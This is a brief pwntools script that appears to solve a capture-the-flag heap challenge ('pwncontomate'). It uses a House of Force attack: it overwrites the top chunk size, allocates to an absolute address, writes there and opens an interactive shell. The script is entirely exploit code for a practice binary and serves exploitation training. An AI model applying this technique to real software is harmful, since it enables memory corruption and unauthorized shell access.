#!/usr/bin/python3
from pwn import process, p64

shell = process("./pwncontomate")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"pwncitos?: ", str(size).encode())
    shell.sendlineafter(b"Ingredientes: ", data)

shell.recvuntil(b"vuelto ")
heap_base = int(shell.recvline().strip(), 16)

malloc(24, b"A" * 24 + p64(0xffffffffffffffff))

offset = (0x602020 - 32) - (heap_base + 32) # offset to target
malloc(offset, b"")

malloc(24, b"Estos son otros ingredientes\x00")

shell.recvline()
shell.interactive()
